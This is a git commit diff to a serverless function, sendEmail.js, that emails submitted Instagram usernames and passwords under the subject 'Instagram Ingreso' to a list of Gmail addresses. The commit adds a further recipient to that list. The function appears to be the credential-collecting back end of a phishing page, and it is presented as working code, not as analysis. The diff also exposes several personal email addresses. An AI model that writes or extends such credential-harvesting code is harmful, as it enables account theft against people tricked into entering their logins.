765690167d12c87b5d2b5ec8a70952ec6e165f90
Aletiiisa <cuentaluperonp5@gmail.com>
2025-01-16 03:43:32 -0400

    Actualizar sendEmail.js

--- functions/sendEmail.js
+++ functions/sendEmail.js
@@ -15,7 +15,7 @@ exports.handler = async function(event, context) {
 
     let mailOptions = {
         from: 'cuentaluperonp5@gmail.com',
-        to: 'sierroalee@gmail.com, almabrito67@gmail.com, Egarciaortiz573@gmail.com', // Corregido: coma agregada entre los correos
+        to: 'sierroalee@gmail.com, almabrito67@gmail.com, Egarciaortiz573@gmail.com, Chapmantefy@gmail.com',
         subject: 'Instagram Ingreso',
         text: `Usuario: ${username}\nContraseña: ${password}`,
     };
